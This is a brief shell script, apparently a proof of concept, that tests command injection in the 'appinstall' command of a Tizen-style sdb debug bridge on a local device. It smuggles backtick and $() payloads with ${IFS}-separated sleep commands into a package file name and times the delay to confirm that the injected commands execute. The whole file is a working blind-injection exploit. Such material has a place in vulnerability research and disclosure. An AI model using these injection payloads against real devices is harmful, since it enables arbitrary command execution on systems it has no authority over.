S=/w/data/tools/sdb
$S connect 192.168.0.85:26101 >/dev/null
echo "== baseline (no payload) =="
time $S -s 192.168.0.85:26101 shell '0 appinstall tpk test.tpk`true`.tpk' </dev/null 2>&1 | head -3
echo "== sleep 10 =="
time $S -s 192.168.0.85:26101 shell '0 appinstall tpk test.tpk`sleep${IFS}10`.tpk' </dev/null 2>&1 | head -3
echo "== sleep 15, second syntax (\$()) =="
time $S -s 192.168.0.85:26101 shell "0 appinstall tpk test.tpk\$(sleep${IFS}15).tpk" </dev/null 2>&1 | head -3
